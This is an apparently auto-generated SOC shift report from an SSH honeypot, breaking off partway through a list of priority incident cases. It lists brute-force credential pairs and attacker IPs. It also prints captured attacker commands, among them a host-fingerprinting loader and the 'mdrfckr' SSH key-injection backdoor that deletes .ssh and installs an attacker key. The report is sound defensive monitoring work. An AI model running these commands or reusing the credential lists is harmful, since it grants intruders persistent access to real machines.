# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-12 |
| **Generated At** | 2026-08-12T05:41:14Z |
| **Shift Time** | 05:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **376** |
| Confirmed Threats | **278** |
| False Positives Filtered | **98** (26.1%) |
| Unique Attacker IPs | **133** |
| Countries of Origin | **37** |
| High Severity Cases | **156** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **220** |
| Malware Samples Analyzed | **3** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **187** |
| Unique Credential Pairs | **114** |
| Unique Usernames | **23** |
| Unique Passwords | **84** |
| Successful Auth Pairs | **163** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 73 |
| `admin` | 25 |
| `user` | 14 |
| `centos` | 13 |
| `support` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 7 |
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `root` | 7 |
| `admin` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 7 |
| `345gs5662d34` | `345gs5662d34` | 7 |
| `admin` | `admin` | 5 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `123@@@` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-12T00:56:36 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-12T00:56:36 |
| `ubnt` | `qwerty12345` | `183.104.220.84` | 2026-08-12T00:57:49 |
| `ubnt` | `qwerty12345` | `61.186.136.36` | 2026-08-12T00:57:57 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-12T00:58:24 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-12T00:58:24 |
| `support` | `support` | `176.53.159.196` | 2026-08-12T01:08:51 |
| `sandeep` | `sandeep` | `164.92.161.148` | 2026-08-12T01:12:46 |
| `345gs5662d34` | `345gs5662d34` | `164.92.161.148` | 2026-08-12T01:12:48 |
| `sandeep` | `3245gs5662d34` | `164.92.161.148` | 2026-08-12T01:12:49 |
| `root` | `Admin@2025` | `166.62.41.13` | 2026-08-12T01:14:05 |
| `345gs5662d34` | `345gs5662d34` | `166.62.41.13` | 2026-08-12T01:14:07 |
| `root` | `3245gs5662d34` | `166.62.41.13` | 2026-08-12T01:14:08 |
| `root` | `Dp123456` | `131.100.242.102` | 2026-08-12T01:14:32 |
| `345gs5662d34` | `345gs5662d34` | `131.100.242.102` | 2026-08-12T01:14:35 |
| `root` | `3245gs5662d34` | `131.100.242.102` | 2026-08-12T01:14:36 |
| `ubnt` | `password321` | `10.0.0.73` | 2026-08-12T01:18:39 |
| `root` | `!Q2w3e4r5t` | `94.198.221.101` | 2026-08-12T01:18:46 |
| `345gs5662d34` | `345gs5662d34` | `94.198.221.101` | 2026-08-12T01:18:49 |
| `root` | `3245gs5662d34` | `94.198.221.101` | 2026-08-12T01:18:50 |
| `admin` | `1qazXSW@` | `111.70.14.135` | 2026-08-12T01:30:42 |
| `admin` | `1qazXSW@` | `213.33.204.130` | 2026-08-12T01:30:54 |
| `blank` | `abcd1234` | `122.187.104.70` | 2026-08-12T01:31:43 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-12T01:37:30 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-12T01:37:31 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-12T01:37:31 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-12T01:39:09 |
| `config` | `root` | `10.0.0.73` | 2026-08-12T01:45:55 |
| `root` | `arcsight` | `10.0.0.73` | 2026-08-12T01:48:19 |
| `admin` | `password@123` | `10.0.0.73` | 2026-08-12T01:52:42 |
| `root` | `admin` | `195.178.110.228` | 2026-08-12T01:57:00 |
| `root` | `password` | `195.178.110.228` | 2026-08-12T01:57:48 |
| `root` | `toor` | `195.178.110.228` | 2026-08-12T01:59:41 |
| `root` | `qwerty` | `195.178.110.228` | 2026-08-12T02:00:39 |
| `root` | `12345` | `195.178.110.228` | 2026-08-12T02:01:34 |
| `support` | `support` | `10.0.0.73` | 2026-08-12T02:02:17 |
| `root` | `letmein` | `195.178.110.228` | 2026-08-12T02:02:30 |
| `root` | `123456789` | `195.178.110.228` | 2026-08-12T02:03:26 |
| `root` | `admin123` | `195.178.110.228` | 2026-08-12T02:04:23 |
| `config` | `root` | `178.178.222.52` | 2026-08-12T02:04:36 |
| `config` | `root` | `178.178.222.61` | 2026-08-12T02:04:43 |
| `root` | `welcome` | `195.178.110.228` | 2026-08-12T02:05:20 |
| `root` | `arcsight` | `119.207.63.208` | 2026-08-12T02:06:07 |
| `root` | `arcsight` | `88.84.209.146` | 2026-08-12T02:06:14 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-08-12T02:06:17 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-08-12T02:07:11 |
| `root` | `root123` | `195.178.110.228` | 2026-08-12T02:08:08 |
| `root` | `alpine` | `195.178.110.228` | 2026-08-12T02:09:05 |
| `admin` | `password@123` | `103.171.39.147` | 2026-08-12T02:09:58 |
| `root` | `changeme` | `195.178.110.228` | 2026-08-12T02:10:03 |
| `root` | `default` | `195.178.110.228` | 2026-08-12T02:11:05 |
| `root` | `r00t` | `195.178.110.228` | 2026-08-12T02:12:07 |
| `root` | `root@123` | `195.178.110.228` | 2026-08-12T02:13:10 |
| `root` | `Root123` | `195.178.110.228` | 2026-08-12T02:14:13 |
| `root` | `root44` | `177.174.0.3` | 2026-08-12T02:15:09 |
| `root` | `!root` | `195.178.110.228` | 2026-08-12T02:15:15 |
| `root` | `root44` | `213.154.80.51` | 2026-08-12T02:15:17 |
| `root` | `rootme` | `195.178.110.228` | 2026-08-12T02:16:12 |
| `admin` | `admin` | `195.178.110.228` | 2026-08-12T02:17:14 |
| `admin` | `password` | `195.178.110.228` | 2026-08-12T02:18:14 |
| `admin` | `123456` | `195.178.110.228` | 2026-08-12T02:19:13 |
| `admin` | `admin123` | `195.178.110.228` | 2026-08-12T02:20:10 |
| `admin` | `letmein` | `195.178.110.228` | 2026-08-12T02:21:09 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-08-12T02:22:08 |
| `Ubnt` | `555555555` | `10.0.0.73` | 2026-08-12T02:22:13 |
| `admin` | `12345` | `195.178.110.228` | 2026-08-12T02:23:00 |
| `admin` | `admin@123` | `195.178.110.228` | 2026-08-12T02:23:53 |
| `admin` | `Admin123` | `195.178.110.228` | 2026-08-12T02:24:49 |
| `admin` | `P@ssw0rd` | `195.178.110.228` | 2026-08-12T02:25:53 |
| `root` | `root44` | `10.0.0.73` | 2026-08-12T02:26:46 |
| `admin` | `welcome` | `195.178.110.228` | 2026-08-12T02:27:05 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-08-12T02:28:01 |
| `admin` | `administrator` | `195.178.110.228` | 2026-08-12T02:28:55 |
| `admin` | `adminroot` | `195.178.110.228` | 2026-08-12T02:29:46 |
| `admin` | `adminadmin` | `195.178.110.228` | 2026-08-12T02:30:38 |
| `user` | `user` | `195.178.110.228` | 2026-08-12T02:31:33 |
| `user` | `password` | `195.178.110.228` | 2026-08-12T02:32:30 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `184.105.139.67` | 2026-08-12T02:33:21 |
| `user` | `123456` | `195.178.110.228` | 2026-08-12T02:33:32 |
| `user` | `qwerty` | `195.178.110.228` | 2026-08-12T02:34:42 |
| `user` | `12345` | `195.178.110.228` | 2026-08-12T02:35:49 |
| `user` | `letmein` | `195.178.110.228` | 2026-08-12T02:36:40 |
| `user` | `welcome` | `195.178.110.228` | 2026-08-12T02:37:32 |
| `user` | `passw0rd` | `195.178.110.228` | 2026-08-12T02:38:30 |
| `centos` | `p@ssword` | `195.222.57.190` | 2026-08-12T02:38:31 |
| `centos` | `p@ssword` | `171.8.42.112` | 2026-08-12T02:38:41 |
| `centos` | `p@ssword` | `223.82.86.2` | 2026-08-12T02:38:51 |
| `centos` | `p@ssword` | `39.164.91.67` | 2026-08-12T02:39:01 |
| `user` | `user123` | `195.178.110.228` | 2026-08-12T02:39:35 |
| `Ubnt` | `555555555` | `117.205.3.26` | 2026-08-12T02:40:17 |
| `user` | `user1` | `195.178.110.228` | 2026-08-12T02:40:48 |
| `user` | `userpass` | `195.178.110.228` | 2026-08-12T02:41:59 |
| `a` | `a` | `10.0.0.73` | 2026-08-12T02:42:12 |
| `user` | `user@123` | `195.178.110.228` | 2026-08-12T02:42:52 |
| `user` | `User123` | `195.178.110.228` | 2026-08-12T02:43:47 |
| `david` | `password` | `149.202.50.58` | 2026-08-12T02:44:28 |
| `345gs5662d34` | `345gs5662d34` | `149.202.50.58` | 2026-08-12T02:44:30 |
| `david` | `3245gs5662d34` | `149.202.50.58` | 2026-08-12T02:44:31 |
| `user` | `guest` | `195.178.110.228` | 2026-08-12T02:44:47 |
| `test` | `test` | `195.178.110.228` | 2026-08-12T02:45:55 |
| `test` | `password` | `195.178.110.228` | 2026-08-12T02:47:13 |
| `test` | `123456` | `195.178.110.228` | 2026-08-12T02:48:15 |
| `test` | `test123` | `195.178.110.228` | 2026-08-12T02:49:09 |
| `test` | `qwerty` | `195.178.110.228` | 2026-08-12T02:50:02 |
| `nobody` | `qwerty123` | `10.0.0.73` | 2026-08-12T02:54:05 |
| `centos` | `121212` | `10.0.0.73` | 2026-08-12T02:56:26 |
| `centos` | `121212` | `103.174.145.35` | 2026-08-12T02:58:04 |
| `centos` | `121212` | `65.20.138.46` | 2026-08-12T02:58:11 |
| `centos` | `password123` | `10.0.0.73` | 2026-08-12T03:01:00 |
| `admin` | `admin` | `47.77.182.54` | 2026-08-12T03:04:09 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-12T03:04:10 |
| `nobody` | `qwerty123` | `110.164.201.73` | 2026-08-12T03:13:01 |
| `centos` | `121212` | `136.185.6.181` | 2026-08-12T03:14:16 |
| `centos` | `password123` | `177.72.87.7` | 2026-08-12T03:18:09 |
| `nobody` | `qwerty1` | `187.8.3.230` | 2026-08-12T03:23:14 |
| `nobody` | `qwerty1` | `195.222.57.190` | 2026-08-12T03:23:26 |
| `blank` | `654321` | `196.188.187.85` | 2026-08-12T03:32:00 |
| `root` | `12345` | `102.220.160.38` | 2026-08-12T03:36:15 |
| `debian` | `maintenance` | `24.97.253.246` | 2026-08-12T03:46:50 |
| `debian` | `maintenance` | `182.75.227.178` | 2026-08-12T03:46:58 |
| `blank` | `654321` | `45.178.227.0` | 2026-08-12T03:48:30 |
| `admin` | `admin` | `34.76.31.34` | 2026-08-12T03:50:20 |
| `nobody` | `qwerty1` | `183.63.220.210` | 2026-08-12T03:51:56 |
| `root` | `﻿------fuck------` | `221.202.188.169` | 2026-08-12T03:52:30 |
| `buble` | `buble` | `130.12.182.227` | 2026-08-12T04:01:50 |
| `centos` | `999999` | `10.0.0.73` | 2026-08-12T04:02:23 |
| `root` | `openelec` | `10.0.0.73` | 2026-08-12T04:04:37 |
| `debian` | `159753` | `10.0.0.73` | 2026-08-12T04:08:51 |
| `root` | `123` | `80.94.92.179` | 2026-08-12T04:11:33 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.14.100.71` | 2026-08-12T04:12:34 |
| `*1` | `$4` | `34.14.100.71` | 2026-08-12T04:12:43 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1591` | `34.14.100.71` | 2026-08-12T04:12:45 |
| `root` | `1234` | `80.94.92.179` | 2026-08-12T04:14:12 |
| `root` | `12345` | `80.94.92.179` | 2026-08-12T04:16:46 |
| `admin` | `admin` | `39.37.128.104` | 2026-08-12T04:20:43 |
| `centos` | `999999` | `192.34.128.202` | 2026-08-12T04:20:46 |
| `root` | `1234567` | `80.94.92.179` | 2026-08-12T04:21:39 |
| `root` | `12345678` | `80.94.92.179` | 2026-08-12T04:23:56 |
| `root` | `123456789` | `80.94.92.179` | 2026-08-12T04:26:10 |
| `root` | `1234567890` | `80.94.92.179` | 2026-08-12T04:28:21 |
| `root` | `123abc` | `80.94.92.179` | 2026-08-12T04:30:43 |
| `debian` | `123abc` | `178.178.194.192` | 2026-08-12T04:31:19 |
| `root` | `1q2w3e4r` | `80.94.92.179` | 2026-08-12T04:33:09 |
| `lbj` | `123456` | `130.12.182.230` | 2026-08-12T04:34:13 |
| `root` | `P@ssw0rd123` | `80.94.92.179` | 2026-08-12T04:35:35 |
| `blank` | `passw0rd` | `10.0.0.73` | 2026-08-12T04:36:18 |
| `root` | `abc123` | `80.94.92.179` | 2026-08-12T04:38:00 |
| `root` | `admin123` | `80.94.92.179` | 2026-08-12T04:40:30 |
| `root` | `letmein` | `80.94.92.179` | 2026-08-12T04:42:57 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.8.158` | 2026-08-12T04:43:41 |
| `*1` | `$4` | `34.76.8.158` | 2026-08-12T04:43:55 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5784` | `34.76.8.158` | 2026-08-12T04:43:57 |
| `root` | `pass123` | `80.94.92.179` | 2026-08-12T04:45:20 |
| `root` | `Wp123456` | `101.47.14.46` | 2026-08-12T04:47:13 |
| `345gs5662d34` | `345gs5662d34` | `101.47.14.46` | 2026-08-12T04:47:18 |
| `root` | `3245gs5662d34` | `101.47.14.46` | 2026-08-12T04:47:20 |
| `root` | `password` | `80.94.92.179` | 2026-08-12T04:47:46 |
| `root` | `password1` | `80.94.92.179` | 2026-08-12T04:50:15 |
| `root` | `qwerty123` | `80.94.92.179` | 2026-08-12T04:52:40 |
| `ranger` | `ranger` | `211.240.117.75` | 2026-08-12T04:53:01 |
| `345gs5662d34` | `345gs5662d34` | `211.240.117.75` | 2026-08-12T04:53:04 |
| `ranger` | `3245gs5662d34` | `211.240.117.75` | 2026-08-12T04:53:06 |
| `blank` | `passw0rd` | `211.178.165.251` | 2026-08-12T04:54:51 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **376** |
| Sessions with Fingerprint | **20** |
| Unique HASSH Fingerprints | **20** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 89 |
| libssh | 39 |
| OpenSSH | 35 |
| Paramiko (Python) | 12 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 74 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 33 | 31 |
| `f555226df196...` | Mirai/variant | 21 | 7 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `a591c4ddccc9...` | Mirai/variant | 5 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 74 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 33 | 31 | Mirai/variant |
| `f555226df196...` | libssh | 21 | 7 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `a591c4ddccc9...` | libssh | 5 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 4 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 71 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`, `80.94.92.179`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
shell
```
```
enable
```
```
system
```
```
ping; sh
```
Source IPs: `39.37.128.104`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `164.92.161.148`, `149.202.50.58`, `211.240.117.75`, `101.47.14.46`, `131.100.242.102`, `94.198.221.101`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **133** |
| Unique ASNs | **87** |
| High-Risk ASNs | **67** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 7 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS6939` | Hurricane Electric LLC | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS197769` | VPS Dedicated LLC | 4 | HIGH |
| `AS25159` | PJSC MegaFon | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (155)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-74339c944fe2

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-12 00:56 |
| **Last Seen** | 2026-08-12 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 00:56:34` | `cowrie.session.connect` |
| `2026-08-12 00:56:34` | `cowrie.client.version` |
| `2026-08-12 00:56:35` | `cowrie.client.kex` |
| `2026-08-12 00:56:36` | `cowrie.login.success` |
| `2026-08-12 00:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13da858cf392

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-12 00:56 |
| **Last Seen** | 2026-08-12 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 00:56:34` | `cowrie.session.connect` |
| `2026-08-12 00:56:34` | `cowrie.client.version` |
| `2026-08-12 00:56:35` | `cowrie.client.kex` |
| `2026-08-12 00:56:36` | `cowrie.login.success` |
| `2026-08-12 00:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6af546b09d

| Field | Detail |
|---|---|
| **Source IP** | `183.104.220[.]84` |
| **First Seen** | 2026-08-12 00:57 |
| **Last Seen** | 2026-08-12 00:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 00:57:46` | `cowrie.session.connect` |
| `2026-08-12 00:57:47` | `cowrie.client.version` |
| `2026-08-12 00:57:47` | `cowrie.client.kex` |
| `2026-08-12 00:57:49` | `cowrie.login.success` |
| `2026-08-12 00:57:49` | `cowrie.direct-tcpip.request` |
| `2026-08-12 00:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.104.220[.]84` to AbuseIPDB if not already reported
- [ ] Block `183.104.220[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c450714de6

| Field | Detail |
|---|---|
| **Source IP** | `61.186.136[.]36` |
| **First Seen** | 2026-08-12 00:57 |
| **Last Seen** | 2026-08-12 00:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 00:57:55` | `cowrie.session.connect` |
| `2026-08-12 00:57:55` | `cowrie.client.version` |
| `2026-08-12 00:57:55` | `cowrie.client.kex` |
| `2026-08-12 00:57:57` | `cowrie.login.success` |
| `2026-08-12 00:57:57` | `cowrie.direct-tcpip.request` |
| `2026-08-12 00:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.186.136[.]36` to AbuseIPDB if not already reported
- [ ] Block `61.186.136[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b648d35d5bc

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-12 00:58 |
| **Last Seen** | 2026-08-12 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 00:58:23` | `cowrie.session.connect` |
| `2026-08-12 00:58:23` | `cowrie.client.version` |
| `2026-08-12 00:58:23` | `cowrie.client.kex` |
| `2026-08-12 00:58:24` | `cowrie.login.success` |
| `2026-08-12 00:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f17654808a20

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-12 00:58 |
| **Last Seen** | 2026-08-12 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 00:58:23` | `cowrie.session.connect` |
| `2026-08-12 00:58:23` | `cowrie.client.version` |
| `2026-08-12 00:58:23` | `cowrie.client.kex` |
| `2026-08-12 00:58:24` | `cowrie.login.success` |
| `2026-08-12 00:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801edf1a5f63

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 01:08 |
| **Last Seen** | 2026-08-12 01:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:08:50` | `cowrie.session.connect` |
| `2026-08-12 01:08:50` | `cowrie.client.version` |
| `2026-08-12 01:08:50` | `cowrie.client.kex` |
| `2026-08-12 01:08:51` | `cowrie.login.success` |
| `2026-08-12 01:08:51` | `cowrie.direct-tcpip.request` |
| `2026-08-12 01:08:51` | `cowrie.direct-tcpip.data` |
| `2026-08-12 01:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b0e5fa4ff34

| Field | Detail |
|---|---|
| **Source IP** | `164.92.161[.]148` |
| **First Seen** | 2026-08-12 01:12 |
| **Last Seen** | 2026-08-12 01:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:12:46` | `cowrie.session.connect` |
| `2026-08-12 01:12:46` | `cowrie.client.version` |
| `2026-08-12 01:12:46` | `cowrie.client.kex` |
| `2026-08-12 01:12:46` | `cowrie.login.success` |
| `2026-08-12 01:12:47` | `cowrie.session.params` |
| `2026-08-12 01:12:47` | `cowrie.command.input` |
| `2026-08-12 01:12:47` | `cowrie.command.failed` |
| `2026-08-12 01:12:47` | `cowrie.log.closed` |
| `2026-08-12 01:12:48` | `cowrie.session.params` |
| `2026-08-12 01:12:48` | `cowrie.command.input` |
| `2026-08-12 01:12:48` | `cowrie.session.file_download` |
| `2026-08-12 01:12:48` | `cowrie.log.closed` |
| `2026-08-12 01:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.161[.]148` to AbuseIPDB if not already reported
- [ ] Block `164.92.161[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a086c7ba19f

| Field | Detail |
|---|---|
| **Source IP** | `164.92.161[.]148` |
| **First Seen** | 2026-08-12 01:12 |
| **Last Seen** | 2026-08-12 01:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

